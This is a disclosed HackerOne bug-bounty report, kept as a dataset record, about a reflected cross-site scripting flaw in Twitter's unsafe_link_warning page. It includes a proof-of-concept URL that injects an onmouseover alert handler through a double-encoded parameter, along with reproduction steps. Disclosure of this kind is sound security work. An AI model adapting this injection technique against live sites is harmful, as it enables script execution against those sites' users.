---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '53098'
original_report_id: '53098'
title: XSS in twitter.com/safety/unsafe_link_warning
weakness: Cross-site Scripting (XSS) - Generic
team_handle: x
created_at: '2015-03-23T16:31:41.943Z'
disclosed_at: '2015-04-03T23:31:12.903Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS in twitter.com/safety/unsafe_link_warning

## Metadata

- HackerOne Report ID: 53098
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: x
- Disclosed At: 2015-04-03T23:31:12.903Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

The following page has XSS.
https://twitter.com/safety/unsafe_link_warning?unsafe_link=[vulnerable_param]

Steps to reproduce: 
1. Go to the following URL using IE: 
https://twitter.com/safety/unsafe_link_warning?unsafe_link=https%3A%2F%2Ftwitter.com%2Fsafety%2Funsafe_link_warning%3Funsafe_link%3Dhttp%3A%2F%2Fexample.com%2520onmouseover%3Dalert%281%29%2520style=font-size:100pt%2520

2. Click "continue".

3.  Do mouseover to "continue". XSS occurs.

FYI in Firefox and Chrome, it is blocked by CSP :)

I recommend fixing this.
Thanks!

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
